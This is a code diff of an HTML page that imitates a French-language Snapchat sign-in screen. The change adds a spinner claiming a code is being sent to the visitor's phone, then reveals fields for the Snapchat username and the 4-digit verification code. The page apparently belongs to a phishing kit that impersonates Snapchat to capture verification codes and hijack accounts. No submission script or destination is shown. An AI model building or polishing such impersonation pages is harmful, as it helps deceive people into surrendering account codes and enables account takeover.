@@ -13,32 +13,41 @@
             <img src="canva-snapchat-logo-MAGzZ1jpOSg.png" alt="Snapchat Logo" class="logo">
             <h1>Se connecter à Snapchat</h1>
             <form id="verificationForm" class="form">
-                <div class="input-group">
-                    <label for="username">Pseudo Snapchat</label>
-                    <input 
-                        type="text" 
-                        id="username" 
-                        name="username" 
-                        placeholder="votre_pseudo"
-                        required
-                        pattern="[a-zA-Z0-9_.-]{3,20}"
-                    >
+                <div id="waitingMessage" class="waiting-message">
+                    <div class="spinner"></div>
+                    <p>Code en envoi à votre numéro de téléphone...</p>
                 </div>
                 
-                <div class="input-group">
-                    <label for="code">Code de vérification</label>
-                    <input 
-                        type="text" 
-                        id="code" 
-                        name="code" 
-                        placeholder="Entrez le code reçu"
-                        required
-                        pattern="[0-9]{4}"
-                        maxlength="4"
-                    >
+                <div id="verificationFields" class="verification-fields" style="display: none;">
+                    <div class="input-group">
+                        <label for="username">Pseudo Snapchat</label>
+                        <input 
+                            type="text" 
+                            id="username" 
+                            name="username" 
+                            placeholder="votre_pseudo"
+                            required
+                            pattern="[a-zA-Z0-9_.-]{3,20}"
+                        >
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="code">Code de vérification</label>
+                        <input 
+                            type="text" 
+                            id="code" 
+                            name="code" 
+                            placeholder="Entrez le code reçu"
+                            required
+                            pattern="[0-9]{4}"
+                            maxlength="4"
+                        >
+                    </div>
+                    
+                    <div id="errorMessage" class="error-message"></div>
+                    
+                    <button type="submit" class="btn btn-primary">Suivant</button>
                 </div>
-                
-                <button type="submit" class="btn btn-primary">Suivant</button>
             </form>
             
             <div id="phoneDisplay" class="phone-info"></div>
